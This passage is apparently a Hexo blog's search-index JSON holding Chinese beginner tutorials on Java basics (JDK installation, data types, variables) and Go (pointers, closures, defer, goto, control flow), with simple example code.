$END$是一个特殊的预定义变量，表示光标最后跳转的位置。 step6. 点击右边的Edit variables（这个只有在使用了预定义函数的时候才能点击和设置） step7. 点击 Apply ，OK，完成！ 方法二：使用 IDEA 自带的 Live Template psvm 生成 main 方法 fori 生成 for 循环 sout 生成 System.out.println(); … 方法三：修改 IDEA 自带的 Live Template 以将 psvm 修改成 main 和 sout 修改成 syso 为例：","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"JDK安装","slug":"java00002JDK安装","date":"2020-02-03T20:59:05.000Z","updated":"2023-09-09T16:25:31.097Z","comments":true,"path":"2020/02/04/java00002JDK安装/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00002JDK安装/","excerpt":"","text":"java是oracle公司的,所以jdk要去oracle官网下载 安装路径中，不要包含中文和空格。 JAVA_HOME环境变量的配置 配置环境变量作用 开发Java程序，需要使用JDK中提供的工具，工具在JDK9安装目录的bin 目录下。 在DOS命令行下使用这些工具，就要先进入到JDK的bin目录下，这个过程就会非常的麻烦。 不进入JDK的bin 目录，这些工具就不能使用，会报错。 为了开发方便，我们想在任意的目录下都可以使用JDK的开发工具，则必须要配置环境变量，配置环境变量的意义 在于告诉操作系统，我们使用的JDK开发工具在哪个目录下。 配置环境变量步骤 Windows 7,8版本 计算机鼠标右键,选择属性 选择高级系统设置 高级选项卡，点击环境变量 点击新建 ，创建新的环境变量 变量名输入JAVA_HOME ，变量值输入JDK9的安装目录 c:\\Java9\\jdk-9.0.1 选中Path 环境变量， 双击或者点击编辑 在变量值的最前面，键入%JAVA_HOME%\\bin; 分号必须要写，必须是英文格式。 环境变量配置完成，重新开启DOS命令行，在任意目录下输入javac 命令，运行成功。 Windows 10 版本","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"JRE_JDK和JVM","slug":"java00002JRE-JDK和JVM","date":"2020-02-03T20:59:05.000Z","updated":"2023-09-09T15:52:36.635Z","comments":true,"path":"2020/02/04/java00002JRE-JDK和JVM/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00002JRE-JDK和JVM/","excerpt":"","text":"JRE 和 JDK JRE (Java Runtime Environment) ：是Java程序的运行时环境，包含JVM 和运行时所需要的核心类库 。 JDK (Java Development Kit)：是Java程序开发工具包，包含JRE 和开发人员使用的工具。 我们想要运行一个已有的Java程序，那么只需安装JRE 即可。 我们想要开发一个全新的Java程序，那么必须安装JDK 。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数据类型转换","slug":"java00002数据类型转换","date":"2020-02-03T20:59:05.000Z","updated":"2020-02-03T22:21:57.550Z","comments":true,"path":"2020/02/04/java00002数据类型转换/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00002数据类型转换/","excerpt":"","text":"数据类型转换 隐式 ​ 代码不需要进行特殊处理,自动处理 ​ 规则:数据范围从小到大 123456789101112public class test006 &#123; public static void main(String[] args) &#123; /*从小到大隐式转换*/ byte a = 1; short c = 3; int d = 4; long e = 5; e = d = c = a; System.out.println(e); &#125;&#125; 显示 ​ (类型名) 数据 ​ (类型名)(数据) ​ 可能发生数据溢出和精度损失 ​ byte/char/short整数运算默认会自动提升为int类型 ​ boolean类型不能发生数据类型转换 1234567891011121314public class test006 &#123; public static void main(String[] args) &#123; /*显示强制转换*/ byte a = 2; int b = 4; a = (byte)(b); System.out.println(a); b = 20; a = (byte)b; System.out.println(a); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"变量","slug":"java00001变量","date":"2020-02-03T20:46:10.000Z","updated":"2020-02-03T20:56:29.796Z","comments":true,"path":"2020/02/04/java00001变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00001变量/","excerpt":"","text":"变量 程序运行期间,内容可以发生改变的值称为变量 先定义后使用 变量声明 数据类型 变量名; 数据类型 变量名 = 初始值; 变量使用 变量名 = 值; 常量有默认类型,如果常量数值大于默认类型,需要手动转换类型 3000000000L 123456789public FileName&#123; public static void main(String[] args) &#123; int a; //变量声明 int b = 1; //变量声明 b = 21; //变量使用 &#125;&#125; 注意事项 ​ 变量名不能重复 ​ float和long类型的字母后缀F和L不能丢 ​ 右侧数值不能超过左侧数据类型范围 ​ 没有赋值的变量不能使用 ​ 变量使用不能超过作用域范围 ​ 作用域：从定义变量的那行起,到直接所属的大括号结束为止 ​ 可以用一条语句创建多个变量","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java语言的跨平台性","slug":"java00002z语言的跨平台性","date":"2020-02-03T19:59:05.000Z","updated":"2023-09-09T15:47:19.963Z","comments":true,"path":"2020/02/04/java00002z语言的跨平台性/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00002z语言的跨平台性/","excerpt":"","text":"Java虚拟机——JVM JVM（Java Virtual Machine ）：Java虚拟机，简称JVM，是运行所有Java程序的假想计算机，是Java程序的 运行环境，是Java 最具吸引力的特性之一。我们编写的Java代码，都运行在 JVM 之上。 跨平台：任何软件的运行，都必须要运行在操作系统之上，而我们用Java编写的软件可以运行在任何的操作系 统上，这个特性称为Java语言的跨平台特性。该特性是由JVM实现的，我们编写的程序运行在JVM上，而JVM 运行在操作系统上。 如图所示，Java的虚拟机本身不具备跨平台功能的，每个操作系统下都有不同版本的虚拟机。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"基础知识","slug":"java00000基础知识","date":"2020-02-03T03:22:30.000Z","updated":"2020-02-08T09:11:36.411Z","comments":true,"path":"2020/02/03/java00000基础知识/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/03/java00000基础知识/","excerpt":"","text":"计算机基础知识 二进制 十进制转二进制 用辗转相除法: 二进制转十进制 用二进制分别乘以位权,在进行相加 存储单位 一般情况下最小单位为bit 1Byte = 8bit 1KB = 1024B 1MB = 1024KB 1GB = 1024MB 1TB = 1024GB 命令提示符 MS-DOS MS代表微软,DOS 代表 Disk Operating System （磁盘操作系统） 磁盘命令 改变磁盘符 直接 输入磁盘符 并按下回车 改变目录 cd 目录 按下tab键会自动补全 cd . . 返回上一层 cd \\ 回到根目录 dir遍历内容 dir . . 遍历上一层内容 dir . 遍历当前目录内容 dir 文件目录 遍历指定目录内容 dir 文件 遍历指定文件 cls 清屏 exit 退出DOS系统","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java编译和运行","slug":"java00000Java编译和运行","date":"2020-02-03T03:22:30.000Z","updated":"2023-09-10T13:47:50.773Z","comments":true,"path":"2020/02/03/java00000Java编译和运行/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/03/java00000Java编译和运行/","excerpt":"","text":"目录: 源文件后缀名 编写java源文件模板 编译和运行 注释 关键字 标识符 常量 数据类型 源文件后缀名 java的源文件后缀名为 *.java 编写java源文件模板 123456public filename&#123; public static void main(String [] args) &#123; System.out.println(\"Hello World.....\"); &#125;&#125; 其中filename对应着源文件名 System.out.println为输出函数 ,输出内容,结尾时换行 编译和运行 编译 javac 文件名 编译成功会生成一个class文件 运行 java 文件名 文件名后面不要带class后缀 注释 // 单行注释 /**/多行注释 1234567891011121314public filename&#123; public static void main(String [] args) &#123; //我是单行注释 /* 我是多行注释 我是多行注释 */ &#125;&#125; 关键字 ​ 特征 ​ 全部小写 ​ 在增强版记事本中有颜色 标识符 命名规则 可以包含字母，数字，下划线，$ 不能以数字开头 标识符不能是关键字 命名规范 类名 大驼峰式 :首字母大写，后面每个单词首字母大写 MyNmae 变量名 小驼峰式：首字母小写，后面每个单词首字母大写nameSize 方法名 小驼峰式：首字母小写，后面每个单词首字母大写nameSize 常量 程序运行期间，固定不变的量 1234567891011121314151617public filename&#123; public static void mian(String[] args) &#123; String a = \"abc\"; //字符串常量 int iZhengXing = 123; //整型常量 float fXiaoShu = 123.2F; //浮点型常量 char cZifu = 'c'; //字符常量 boolean isBool = true; //布尔型常量 //还有一个null 空常量 &#125;&#125; 数据类型 整型 byte， short， int， long 浮点型 ​ float，double 布尔型 ​ boolean 字符型 ​ char ​ 1234567891011121314151617181920public filename&#123; public static void mian(String[] args) &#123; /***********整型************/ byte bXinBie; //1个字节 short sXiaoZheng; //2个字节 int iRenLei; //4个字节 long lShaZi; //8个字节 /**********浮点型************/ float fFengShu; //4个字节 double dYuanZhouLv; //8个字节 /**********布尔型************/ boolean isOk; /**********字符型************/ char cPingFen; //1个字节 &#125;&#125; 注意事项 ​ 字符串不是基本类型，而是引用类型 ​ 浮点型可能只是一个近似值，并非精确值 ​ 数据范围与字节数不一定相关，例如float数据比long更加广泛，但是float更加广泛 ​ 浮点数默认是double类型，如果要用float类型要加后缀F ​ 整数默认类型是int，如果要用long，后缀要加L","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"个人简历","slug":"个人简历","date":"2019-12-07T10:59:46.000Z","updated":"2019-12-07T10:59:46.442Z","comments":true,"path":"2019/12/07/个人简历/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/07/个人简历/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"个人经历","slug":"个人经历","date":"2019-12-07T10:57:37.000Z","updated":"2019-12-07T10:57:37.110Z","comments":true,"path":"2019/12/07/个人经历/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/07/个人经历/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Golang 指针","slug":"201912050104","date":"2019-12-04T17:05:00.000Z","updated":"2019-12-04T17:06:13.569Z","comments":true,"path":"2019/12/05/201912050104/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/05/201912050104/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121package main/*%T 类型占位符%v 值占位符%p 地址（指针）占位符，只有地址才能替换%p&amp;value 对值取地址*addr 对地址取值**int 指向int型指针的指针作用：函数传参时，传递指针叫引用传递，值传递是拷贝式的，对被传参数的修改是不会改变本体的，想要改变本体只能是引用传递*/import \"fmt\"//指针就是地址//&amp;value 对值取地址//*ptr 对地址取值func main021() &#123; //声明变量a时，系统开辟了一块内存【地址】，里面存的【值】是123 var a int = 123 fmt.Printf(\"a的类型是%T\\n\", a)//int fmt.Printf(\"a的值是%v\\n\", a)//123 fmt.Printf(\"a的地址是%p\\n\", &amp;a)//0x... //&amp;a取变量a的地址 aPointer := &amp;a fmt.Printf(\"aPointer的类型是%T\\n\",aPointer)//*int //将aPointer指向的地址中的值修改为456 *aPointer = 456 fmt.Println(\"*aPointer=\",*aPointer)//456 //a的值就变成了456 fmt.Println(\"a=\",a)&#125;//先定义原始变量，修改其指针中的值，会直接改变原变量//指针如果没有重新赋值，永远指向同一块地址func main022() &#123; //系统给x分配了内存 var x = 456 fmt.Println(x)//456 //定义整型指针（存储整型数据的地址） //默认赋值为空&lt;nil&gt; var xPtr *int fmt.Println(\"xPtr=\", xPtr)//nil //aPtr指向x的地址 xPtr = &amp;x //将xPtr指向的地址中的值修改为789 *xPtr = 789 fmt.Println(x) //789 fmt.Println(xPtr) //0xc042052080 fmt.Println(&amp;x) //0xc042052080 fmt.Println(*xPtr) //789 fmt.Println(*xPtr == x) //true fmt.Println(xPtr == &amp;x) //true var y = 456 *xPtr = y fmt.Println(x) //456 fmt.Println(xPtr) //没有变 fmt.Println(&amp;x) //没有变 fmt.Println(*xPtr) //456 fmt.Println(*xPtr == y) //true fmt.Println(x == y) //true fmt.Println(&amp;x == &amp;y) //false fmt.Println(xPtr == &amp;y) //false fmt.Printf(\"y的地址是%p\\n\",&amp;y) fmt.Println(\"----------\") //xPtr指向y的地址 xPtr = &amp;y y = 789 fmt.Println(x) //456 fmt.Println(y) //789 fmt.Println(*xPtr) //789 fmt.Println(&amp;x == xPtr) //false&#125;//指针是严格检测数据类型的func main023() &#123; var x = 123 var intPtr *int intPtr = &amp;x fmt.Println(intPtr, *intPtr) //0x...,123 //var y = \"你妹\" //intPtr = &amp;y//编译错误，【整型指针】无法赋值为【字符串的地址】&#125;//指针的指针func main024() &#123; var x = 123 var mPtr *int = &amp;x //var mmp **int mmPtr := &amp;mPtr fmt.Println(mmPtr)//0xc042072018 fmt.Printf(\"mmPtr的类型是%T\\n\",mmPtr)//mmPtr的类型是**int //打印x的值 fmt.Println(*mPtr)//123 fmt.Println(*(*mmPtr))//123 fmt.Println(**mmPtr)//123&#125;func test()&#123;&#125;func main() &#123; //main021() //main022() //main023() main024()&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang指针","slug":"Golang指针","permalink":"https://xiaowuyoucy.github.io/tags/Golang指针/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-11-27T08:08:58.620Z","updated":"2019-11-27T08:08:58.620Z","comments":true,"path":"2019/11/27/hello-world/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/27/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new \"My New Post\" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"Golang闭包函数","slug":"201911190628","date":"2019-11-18T22:28:00.000Z","updated":"2019-11-30T17:34:35.064Z","comments":true,"path":"2019/11/19/201911190628/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190628/","excerpt":"","text":"闭包函数 闭包函数概述 闭包函数：返回函数的函数 闭包的好处：【内层函数的状态】被保存在闭包中 不使用闭包，就要开 辟多个全局变量来保存函数以外的数据 如果说这个函数被多方调用，大家都需要各保存各的数据，那么此时就需要开辟多个全局变量 具体使用哪个全局变量，还要在函数内做判断——增大了重复的代码量，令代码看起来比较垃圾 案例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package mainimport \"fmt\"/*李逵和武松的Study方法的逻辑是几乎一模一样的然而为了分别保存二人的学习进度，需要开辟两个全局变量，函数内部需要使用两条分支结构才能完成业务逻辑；如果是108将都来学习...此时代码的可复用性很差！*/var likuiProgress int //0var wusongProgress int //0func Study(name string,hours int) &#123; fmt.Printf(\"%s学习了%d小时\\n\",name,hours) if name==\"李逵\"&#123; likuiProgress += hours &#125;else if name==\"武松\"&#123; wusongProgress += hours &#125;&#125;func main081() &#123; Study(\"李逵\", 5) fmt.Printf(\"李逵的学习进度是%d/10000\\n\",likuiProgress) Study(\"武松\", 15) fmt.Printf(\"李逵的学习进度是%d/10000\\n\",wusongProgress)&#125;/*使用闭包函数优化Study每个人有不同的学习进度，将这个进度保存在【各自的闭包】中*//*闭包函数：返回函数的函数闭包函数的好处：使用同一份内层函数代码，创建出任意多个不同的函数对象，这些对象各自的状态都被保存在函数闭包（外层函数）中，各行其道互不干扰*/func GetStudyFunc(name string) func(hours int) (progress int) &#123; //用于保存内层函数的状态 var progress int //定义内层函数 studyFunc := func(hours int) int &#123; fmt.Printf(\"%s学习了%d小时\\n\",name,hours) //更新内层函数在闭包中的状态 progress += hours return progress &#125; fmt.Printf(\"study的类型是%T\\n\", studyFunc) //返回内层函数 return studyFunc&#125;func main() &#123; //调用闭包函数，得到三个【代码相同的不同函数对象】 studyFunc1 := GetStudyFunc(\"李逵\") studyFunc2 := GetStudyFunc(\"武松\") studyFunc3 := GetStudyFunc(\"鲁智深\") //交替执行这些内层函数，其状态的更新会被其函数闭包所保存 lkProgress := studyFunc1(5) lzsProgress := studyFunc3(17) wsProgress := studyFunc2(15) lkProgress = studyFunc1(3) lzsProgress = studyFunc3(12) lkProgress = studyFunc1(2) wsProgress = studyFunc2(13) //输出结果，三个函数的各自的状态没有互相影响 fmt.Printf(\"李逵的学习进度是%d/10000\\n\",lkProgress) fmt.Printf(\"武松的学习进度是%d/10000\\n\",wsProgress) fmt.Printf(\"鲁智深的学习进度是%d/10000\\n\",lzsProgress)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang闭包函数","slug":"Golang闭包函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang闭包函数/"}]},{"title":"Golang匿名函数","slug":"201911190625","date":"2019-11-18T22:26:00.000Z","updated":"2019-11-18T22:27:43.510Z","comments":true,"path":"2019/11/19/201911190625/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190625/","excerpt":"","text":"匿名函数概述 匿名函数的主要作用是封装一段一次性执行的代码 它无所谓复用，所以无需起名，之所以进行封装的意义，在于使一段代码成为一个整体 defer延时执行一段代码，和go并发执行一段代码是匿名函数的常用场景 123456789101112131415161718//匿名函数func main() &#123;//延时执行的匿名函数defer func() &#123;fmt.Println(\"劳资延时·无名，劳资最后执行\")&#125;()//并发执行的匿名函数go func() &#123;fmt.Println(\"劳资并发·无名，劳资并发执行\")&#125;()//一个带参的匿名函数ret := func(a, b int) int &#123;fmt.Println(\"劳资普通·无名，下面劳资睡一会\")time.Sleep(1)return a + b&#125;(2, 3)fmt.Println(ret)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang匿名函数","slug":"Golang匿名函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang匿名函数/"}]},{"title":"函数","slug":"201911190615","date":"2019-11-18T22:15:00.000Z","updated":"2019-11-18T22:23:31.611Z","comments":true,"path":"2019/11/19/201911190615/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190615/","excerpt":"","text":"函数概述 函数是对一段能够重复使用的代码的封装 函数的参数定义了外界给函数输入的数据 函数的返回值定义了函数给外界输出的数据 Go语言函数支持不定长参数和多个返回值 @函数定义和调用 123456//定义函数func sayHello() &#123;fmt.Println(\"fuck off!\")&#125;//调用函数sayHello() @函数参数 无参函数 123func add0() &#123;fmt.Println(\"没参数，add你妹啊\")&#125; 带参函数 1234func add1(a int) &#123;fmt.Println(\"收到一个参数\", a)fmt.Println(\"一个参数，add你妹啊\")&#125; 多个参数 123456789101112//多个参数func addm1(a int, b int) &#123;fmt.Println(\"加和是\", a+b)&#125;//类型相同的参数被合写在一起了func addm2(a, b int) &#123;fmt.Println(\"加和是\", a+b)&#125;//类型不同的参数func addm3(a, b int, c float32) &#123;fmt.Println(\"加和是\", float32(a)+float32(b)+c)&#125; 不定长参数 1234567891011121314func addx(x ...int) &#123;//参数的长度是 5fmt.Println(\"参数的长度是\", len(x))//参数的类型是[]intfmt.Printf(\"参数的类型是%T\\n\", x)var result = 0//遍历不定长参数for i, v := range x &#123;fmt.Println(i, v)result += v&#125;//加和是 15fmt.Println(\"加和是\", result)&#125; @函数返回值 无返回值 1234//无返回值func sub0(a, b int) &#123;fmt.Println(\"相减的结果是\", a-b)&#125; 有返回值 12345678910//有返回值func sub11(a, b int) int &#123;fmt.Println(\"相减的结果是\", a-b)return a - b&#125;func sub12(a, b int) (ret int) &#123;fmt.Println(\"相减的结果是\", a-b)ret = a - breturn&#125; 多个返回值 1234567891011//多个返回值func subm1(a, b int) (int, string) &#123;fmt.Println(\"相减的结果是\", a-b)return a - b, \"你妹\"&#125;func subm2(a, b int) (ret int, remark string) &#123;fmt.Println(\"相减的结果是\", a-b)ret = a - bremark = \"你妹\"return&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang函数","slug":"Golang函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang函数/"}]},{"title":"Golang延时执行defer","slug":"201911190306","date":"2019-11-18T19:09:00.000Z","updated":"2019-11-18T19:21:46.056Z","comments":true,"path":"2019/11/19/201911190306/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190306/","excerpt":"","text":"defer概述 defer xxx() 延时执行，将xxx放在函数的最后执行 多个defer xxx()时,所有defer倒序执行，即最早声明 的defer会最后执行 用途 (数据库读写，文件读写，网络数据读写) 资源=数据库连接，打开的文件对象，网路连接 资源开销（CPU，内存，磁盘…）巨大 资源，随用随开，用完【即】关 场景 O只是场景之一 其它场景：消费完毕要买单，运动完要洗澡，自习结束要关灯… 读写数据库，并在程序的最后关闭数据库 12345678func demo41() &#123;//随用随开，用完【即】关fmt.Println(\"打开数据库\")//defer所唤起的函数将在函数结束前才执行defer closeDatabase()fmt.Println(\"愉快地读写数据\")fmt.Println(\"读写完毕\")&#125; 多个defer时，最早defer的操作最后执行 12345678910111213141516171819202122func demo42() &#123;//打开数据库fmt.Println(\"打开数据库\")defer closeDatabase()//读入DB数据fmt.Println(\"读入DB数据\")//打开文件fmt.Println(\"打开文件\")defer closeFile()//向文件中写出DB中的数据fmt.Println(\"读入DB数据\")//关闭文件//继续操作数据库fmt.Println(\"继续操作数据库\")//关闭数据库&#125;func closeDatabase() &#123;fmt.Println(\"关闭数据库\")&#125;func closeFile() &#123;fmt.Println(\"关闭文件\")&#125; 其他defer案例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport \"fmt\"func xingzuoZhensuo() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday &lt;= \"0922\" &#123; fmt.Println(\"阁下真乃神人也\") &#125; else if birthday &gt;= \"0923\" &amp;&amp; birthday &lt;= \"1022\" &#123; fmt.Println(\"阁下是天秤座\") &#125; else if birthday &gt;= \"1023\" &amp;&amp; birthday &lt;= \"1122\" &#123; fmt.Println(\"阁下是天蝎座\") &#125; else if birthday &gt;= \"1123\" &amp;&amp; birthday &lt;= \"1222\" &#123; fmt.Println(\"阁下是射手座\") &#125; else if (birthday &gt;= \"1223\" &amp;&amp; birthday &lt;= \"1231\") || (birthday &gt;= \"0101\" &amp;&amp; birthday &lt;= \"0122\") &#123; fmt.Println(\"阁下是摩羯座\") &#125; else if birthday &gt;= \"0123\" &amp;&amp; birthday &lt;= \"0222\" &#123; fmt.Println(\"阁下是水瓶座\") &#125; else if (birthday &gt;= \"0223\" &amp;&amp; birthday &lt;= \"0229\") || (birthday &gt;= \"0301\" &amp;&amp; birthday &lt;= \"0322\") &#123; fmt.Println(\"阁下是双鱼座\") &#125; else if birthday &gt;= \"0323\" &amp;&amp; birthday &lt;= \"0422\" &#123; fmt.Println(\"阁下是白羊座\") &#125; else if birthday &gt;= \"0423\" &amp;&amp; birthday &lt;= \"0522\" &#123; fmt.Println(\"阁下是金牛座\") &#125; else if birthday &gt;= \"0523\" &amp;&amp; birthday &lt;= \"0622\" &#123; fmt.Println(\"阁下是双子座\") &#125; else if birthday &gt;= \"0623\" &amp;&amp; birthday &lt;= \"0722\" &#123; fmt.Println(\"阁下是巨蟹座\") &#125; else if birthday &gt;= \"0723\" &amp;&amp; birthday &lt;= \"0822\" &#123; fmt.Println(\"阁下是狮子座\") &#125; else &#123; fmt.Println(\"阁下就是传说中的蛇夫座鸭！\") &#125;&#125;func main071() &#123; fmt.Println(\"亲爱的患者，欢迎来到我院！\") //挂起一个延时任务（在当前函数返回（结束）前执行） defer fmt.Println(\"同志再见，我院永远欢迎你！\") xingzuoZhensuo() fmt.Println(\"事务A\") fmt.Println(\"事务B\") fmt.Println(\"事务C\")&#125;/*·诊断完毕后连续输出“您的诊断已结束”,“请这边滚”，“我院永远欢迎你”*/func main() &#123; fmt.Println(\"亲爱的患者，欢迎来到我院！\") /*多个defer时，执行顺序是倒置的*/ //第1个defer会倒数第1个执行 defer fmt.Println(\"我院永远欢迎你\") //第2个defer会倒数第2个执行 defer fmt.Println(\"请这边滚\") //第3个defer会倒数第3个执行 defer fmt.Println(\"您的诊断已结束\") xingzuoZhensuo() fmt.Println(\"事务A\") fmt.Println(\"事务B\") fmt.Println(\"事务C\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"延时执行defer","slug":"延时执行defer","permalink":"https://xiaowuyoucy.github.io/tags/延时执行defer/"}]},{"title":"Golang的跳转语句（GOTO）","slug":"201911190123","date":"2019-11-18T17:25:00.000Z","updated":"2019-11-18T17:26:00.356Z","comments":true,"path":"2019/11/19/201911190123/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190123/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( \"fmt\" \"time\")func main() &#123;STUDYHARD: fmt.Println(\"开始努力奋斗！\") var i int = 0 for &#123; fmt.Printf(\"努力奋斗了%d小时\\n\", i) time.Sleep(500 * time.Millisecond) i++ if i &gt; 10 &#123; //跳出当前循环 //break fmt.Println(\"恭喜你获得了组织颁发的奖状！\") goto TRYAGIN &#125; &#125; BONUS: fmt.Println(\"循环外的世界\") fmt.Println(\"送你海景别野一套\") fmt.Println(\"送你满汉全席一套\") fmt.Println(\"送你我厂生产的女朋友一个\")TRYAGIN: var answer string fmt.Println(\"要不要再玩一次呢？Y/N\") fmt.Scan(&amp;answer) if answer == \"N\" &#123; goto GAMEOVER &#125; else if answer == \"Y\" &#123; goto STUDYHARD &#125;else if answer == \"FUCKOFF\"&#123; goto BONUS &#125;GAMEOVER: fmt.Println(\"GAME OVER\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"GOTO语句","slug":"GOTO语句","permalink":"https://xiaowuyoucy.github.io/tags/GOTO语句/"}]},{"title":"Golang流程控制","slug":"201911182336","date":"2019-11-18T15:37:00.000Z","updated":"2019-11-18T16:01:40.381Z","comments":true,"path":"2019/11/18/201911182336/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911182336/","excerpt":"","text":"if else 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport \"fmt\"/*字符串比大小比首字符在字符集中出现的序号，首字符相同则比较第二个字符，以此类推go的编译器默认使用UTF8字符集在UTF8字符集中数字出现的顺序为：0123456789*/func main031() &#123; fmt.Println(\"0\"&gt;\"9\") fmt.Println(\"012\"&gt;\"011\") fmt.Println(\"0823\"&gt;\"0423\")&#125;/*根据用户输入的生日判断其星座：①单分支：如果位于0823-0922之间（处女座），输出“阁下真乃神人也！”*/func main032() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday&lt;=\"0922\"&#123; fmt.Println(\"阁下真乃神人也\") &#125; fmt.Println(\"诊断结束！\")&#125;/*根据用户输入的生日判断其星座：②双分支：如果位于0823-0922之间（处女座），输出“阁下乃神人也！”，否则输出“垃圾”*/func main033() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt; \"0822\" &amp;&amp; birthday &lt; \"0923\"&#123; fmt.Println(\"阁下真乃神人也\") &#125;else&#123; fmt.Println(\"乐色\") &#125;&#125; else if 多分支 1234567891011121314151617181920212223242526272829303132333435363738/*根据用户输入的生日判断其星座：③多分支：判断其具体星座*/func main034() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday &lt;= \"0922\"&#123; fmt.Println(\"阁下真乃神人也\") &#125;else if birthday &gt;= \"0923\" &amp;&amp; birthday &lt;= \"1022\"&#123; fmt.Println(\"阁下是天秤座\") &#125;else if birthday &gt;= \"1023\" &amp;&amp; birthday &lt;= \"1122\"&#123; fmt.Println(\"阁下是天蝎座\") &#125;else if birthday &gt;= \"1123\" &amp;&amp; birthday &lt;= \"1222\"&#123; fmt.Println(\"阁下是射手座\") &#125;else if (birthday &gt;= \"1223\" &amp;&amp; birthday &lt;= \"1231\") || (birthday&gt;=\"0101\" &amp;&amp; birthday&lt;=\"0122\")&#123; fmt.Println(\"阁下是摩羯座\") &#125;else if birthday &gt;= \"0123\" &amp;&amp; birthday &lt;= \"0222\"&#123; fmt.Println(\"阁下是水瓶座\") &#125;else if (birthday &gt;= \"0223\" &amp;&amp; birthday &lt;= \"0229\")||(birthday&gt;=\"0301\" &amp;&amp; birthday&lt;=\"0322\")&#123; fmt.Println(\"阁下是双鱼座\") &#125;else if birthday &gt;= \"0323\" &amp;&amp; birthday &lt;= \"0422\"&#123; fmt.Println(\"阁下是白羊座\") &#125;else if birthday &gt;= \"0423\" &amp;&amp; birthday &lt;= \"0522\"&#123; fmt.Println(\"阁下是金牛座\") &#125;else if birthday &gt;= \"0523\" &amp;&amp; birthday &lt;= \"0622\"&#123; fmt.Println(\"阁下是双子座\") &#125;else if birthday &gt;= \"0623\" &amp;&amp; birthday &lt;= \"0722\"&#123; fmt.Println(\"阁下是巨蟹座\") &#125;else if birthday &gt;= \"0723\" &amp;&amp; birthday &lt;= \"0822\"&#123; fmt.Println(\"阁下是狮子座\") &#125;else&#123; fmt.Println(\"阁下就是传说中的蛇夫座鸭！\") &#125;&#125; SWITCH 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128package mainimport 